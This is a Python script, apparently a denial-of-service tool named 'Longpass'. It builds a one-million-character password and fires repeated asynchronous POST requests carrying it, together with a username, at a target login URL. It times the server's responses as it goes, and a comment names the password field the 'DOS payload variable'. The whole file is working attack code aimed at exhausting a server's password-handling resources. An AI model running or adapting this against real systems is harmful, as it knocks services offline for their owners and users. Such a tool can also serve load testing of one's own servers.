import sys
import asyncio
import aiohttp
import time

class Longpass:

    url = ""
    delay = 1
    username = ""
    size = 1000000
    repeats = 20
    password = ""

    iterations = 0
    tasks = list()
    payload = dict()

    ui = list()

    def run(self):

        password = self.generatePassword(self.size)
        sys.stdout.write("Done!\n")

        # Set the POST payload
        # @todo Add POST variables from the command line argument, ie. --variables username=john,email=user@domain.com
        # @todo Add an ability to set a custom variable name for the "password" DOS payload variable
        self.payload = { 'username': self.username, 'password': password }


        # Add requests to the task list
        for i in range(self.repeats):
            delay = i * self.delay
            self.tasks.append(self.makeRequest(delay))

        # Event loop that waits for tasks to complete
        loop = asyncio.get_event_loop()

        # Run the loop until every task is complete
        loop.run_until_complete(asyncio.wait(self.tasks))
        #loop.run_until_complete(self.shootTasks())


        # Close the loop
        loop.close()


    def shootTasks(self):
        for i in range(self.repeats):
            self.makeRequest()
            time.sleep(self.delay)

    def generatePassword(self, size):
        # Generate password
        # @todo Generate the password from random characters
        sys.stdout.write("Generating password...\n")
        return "x" * size

    def clear(self):
        """Clear screen, return cursor to top left"""
        sys.stdout.write('\033[2J')
        sys.stdout.write('\033[H')
        sys.stdout.flush()

    def printStatus(self, duration):
        #self.clear()
        sys.stdout.write("" + str(round((self.iterations / (self.repeats * 2)) * 100, 2)) + "% done - server response time " + str(round(duration, 2)) + " seconds.\n")
        #sys.stdout.write("Server response time " + str(round(duration, 2)) + " seconds.")

    async def makeRequest(self, delay):
        """
        Make an asynchronous POST request
        """
        # Queue up
        await asyncio.sleep(delay)

        sys.stdout.write("Starting task with delay " + str(delay) + "\n")

        # Add to iteration counter
        self.iterations += 1

        #self.printStatus(0)

        # Measure time
        start = time.time()

        # The actual request
        response = await aiohttp.post(self.url, data = self.payload)

        # Add to iteration counter
        self.iterations += 1

        # Request response time
        duration = time.time() - start

        # Display the progress
        self.printStatus(duration)

        # Close the connection
        response.close()

        # Wait for a given time
        #time.sleep(self.delay)
